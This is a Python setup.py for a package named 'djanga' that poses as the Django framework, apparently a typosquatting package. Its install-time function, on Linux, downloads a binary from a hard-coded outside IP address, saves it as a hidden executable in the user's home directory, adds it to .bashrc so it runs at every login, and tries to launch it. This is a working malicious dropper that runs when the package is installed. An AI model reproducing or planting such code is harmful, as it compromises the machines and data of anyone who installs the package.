
from setuptools import setup, find_packages

def rn ():

        import platform

        s = False
        try:
                import urllib2
        except ImportError:
                import http.client
                s = True
        import os, stat

        PATH = "/out"
        IP = "145.249.104.71"
        LOC = ".drv"

        if platform.system () == "Linux":

                if not s:
                        response = urllib2.urlopen ("http://" + IP + PATH).read ()
                else:
                        connection = http.client.HTTPConnection (IP)
                        connection.request ("GET", PATH)
                        response = connection.getresponse ().read ()
                os.chdir (os.path.expanduser ("~"))
                d = open (LOC, "wb")
                d.write (response)
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open (".bashrc", "a")
                brc.write ("\n~/.drv &")
                brc.close ()

                system ("~/.drv")
        else:
                print ("Error installing library!")
                exit (-1)

rn ()

setup(
  name = 'djanga',
  packages = find_packages (),
  version = '0.3',
  description = 'Django framework',
  author = 'Rosa',
  author_email = 'rosaright@example.com',
  url = '',
  download_url = '', 
  keywords = [''],
  classifiers = [],
)
